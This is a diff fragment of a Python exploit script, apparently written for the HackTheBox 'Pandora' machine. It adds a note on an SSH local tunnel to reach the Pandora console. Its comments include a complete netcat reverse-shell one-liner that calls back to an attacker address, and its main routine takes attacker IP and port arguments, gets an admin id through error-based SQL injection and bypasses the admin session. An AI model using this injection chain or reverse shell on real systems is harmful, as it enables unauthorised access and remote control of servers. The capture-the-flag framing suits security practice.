@@ -9,6 +9,11 @@ import requests
 # + Spawn a reverse shell
 # Author: @nightwolfx2
 
+# Pre-requisites:
+# + Run an SSH Local tunnel to 127.0.0.1 port 80 to be able to reach pandora console as is only accesible from the inside.
+#   Example:
+#   ssh -L 9090:127.0.0.1:80 <username>@pandora.htb 
+#
 # Help articles:
 # + How to exploit error based SQL Injections -> https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 # + Reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f
@@ -106,10 +111,10 @@ if __name__ == '__main__':
     attacker_ip = args.attacker
     attacker_port = args.listen
     # Examples of how to gather data from DB using Error based SQL injection, not really used in the exploitation...
-    #count=count_session_ids(full_target)
-    #sessions=session_ids(full_target, count)
-    #for i in sessions:
-    #    print(i)
+    # count=count_session_ids(full_target)
+    # sessions=session_ids(full_target, count)
+    # for i in sessions:
+    #   print(i)
     id=get_admin_id(full_target)
     if int(id) != 0:
         bypass_admin(full_target, id, session)
